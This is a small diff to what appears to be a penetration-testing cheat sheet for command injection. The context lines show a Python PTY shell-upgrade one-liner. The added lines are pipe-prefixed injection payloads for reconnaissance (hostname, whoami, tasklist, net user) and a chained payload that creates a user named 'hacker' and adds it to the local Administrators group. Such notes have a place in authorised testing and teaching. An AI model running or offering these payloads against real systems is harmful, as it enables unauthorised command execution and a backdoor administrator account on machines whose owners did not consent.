@@ -30,6 +30,12 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ls
 exit
 
+| hostname
+| whoami
+| tasklist
+| net user
+| net user hacker hacker /add then | net localgroup Administrators hacker /add
+
 Command Execution:
 If Linux
 | ls "<Path>"
